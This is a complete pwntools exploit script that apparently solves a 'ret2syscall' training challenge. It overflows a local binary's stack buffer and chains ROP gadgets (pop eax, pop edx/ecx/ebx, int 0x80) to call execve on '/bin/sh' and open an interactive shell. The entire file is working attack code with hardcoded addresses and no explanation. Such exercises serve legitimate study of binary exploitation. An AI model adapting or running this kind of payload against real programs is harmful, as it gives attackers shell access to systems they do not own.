from pwn import *

elf = ELF('ret2syscall')
io =process(elf.path)

pop_eax_ret_addr = 0x080bb196 # pop eax;ret
pop_ebx_ecx_edx_ret_addr = 0x0806eb90 # pop edx ; pop ecx ; pop ebx ; ret
bin_sh_addr = 0x080be408 # /bin/sh
int_addr = 0x08049421  # int 0x80

payload = b'a' * 0x6c + b'bbbb'
payload += p32(pop_eax_ret_addr)+p32(0xb)
payload += p32(pop_ebx_ecx_edx_ret_addr) + p32(0)+p32(0)+p32(bin_sh_addr)
payload += p32(int_addr)

io.sendline(payload)
io.interactive()